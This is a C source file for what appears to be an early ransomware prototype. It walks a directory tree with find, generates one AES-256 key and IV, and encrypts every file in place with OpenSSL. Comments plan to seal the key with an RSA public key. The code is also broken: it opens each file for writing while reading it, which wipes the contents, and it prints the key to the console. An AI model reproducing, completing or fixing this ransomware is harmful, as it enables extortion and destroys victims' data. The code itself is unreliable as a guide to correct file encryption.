#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>

#define MAX_COMMAND 1024
#define KEY_SIZE 256
#define IV_SIZE 16
#define BUFFER_SIZE 1024

void handleErrors() {
    exit(1);
}

int encrypt(char buffer[1000], unsigned char key[KEY_SIZE / 8], unsigned char iv[IV_SIZE]) {
    const char *input_file = buffer;
    const char *output_file = buffer;

    // ! encrypt the key using a rsa public key and iv and put it into a txt file

    for (int x =0; x < 1000; x++) {

            if (buffer[x] == '\n') {
                printf("FOUND A FUCKER\n");
            }
    }


    printf("key: %s\n", key);

    printf("iv: %s\n", iv);


    // Open input and output files
    FILE *in_file = fopen(input_file, "rb");
    if (!in_file) {
        return 1;
    }
    FILE *out_file = fopen(output_file, "wb");
    if (!out_file) {
        fclose(in_file);
        return 1;
    }

    // Initialize encryption context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        handleErrors();
    }
    if (!EVP_EncryptInit_ex2(ctx, EVP_aes_256_cbc(), key, iv, NULL)) {
        handleErrors();
    }

    // Read input file and encrypt data
    unsigned char in_buffer[BUFFER_SIZE];
    unsigned char out_buffer[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int out_len;
    int bytesEncrypted = 0;
    while (1) {
        int in_len = fread(in_buffer, 1, BUFFER_SIZE, in_file);
        if (in_len <= 0) {
            break;
        }
        if (!EVP_EncryptUpdate(ctx, out_buffer, &out_len, in_buffer, in_len)) {
            handleErrors();
        }
        bytesEncrypted += out_len;
        fwrite(out_buffer, 1, out_len, out_file);
    }
    printf("did i get here?");
    // Finalize encryption
    if (!EVP_EncryptFinal_ex(ctx, out_buffer, &out_len)) {
        handleErrors();
    }

    bytesEncrypted += out_len;
    fwrite(out_buffer, 1, out_len, out_file);

    // Clean up
    EVP_CIPHER_CTX_free(ctx);
    fclose(in_file);
    fclose(out_file);

    printf("Encryption successful. Total bytes encrypted: %d\n", bytesEncrypted);

    return 0;
}


int main() {
    char command[MAX_COMMAND];
    char buffer[MAX_COMMAND];

    // Construct the find command
    snprintf(command, sizeof(command), "find /home/nix/Desktop/ransom/localroot -type f");

    // Open a pipe to the command
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        perror("popen failed");
        return 1;
    }

    unsigned char key[KEY_SIZE / 8];
    unsigned char iv[IV_SIZE];
    
    // ! encrypt the key using a rsa public key and iv and put it into a txt file



    if (RAND_bytes(key, sizeof(key)) != 1 || RAND_bytes(iv, sizeof(iv)) != 1) {
        handleErrors();
    }
    
    // Read the output of the command line by line and store it in a variable
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        // Do something with the file path (e.g., store it in an array)
        //
        //
        buffer[strlen(buffer) - 1] = '\0';
        //puts(buffer);

        encrypt(buffer, key, iv);
    }

    // Close the pipe
    pclose(pipe);

    return 0;
}
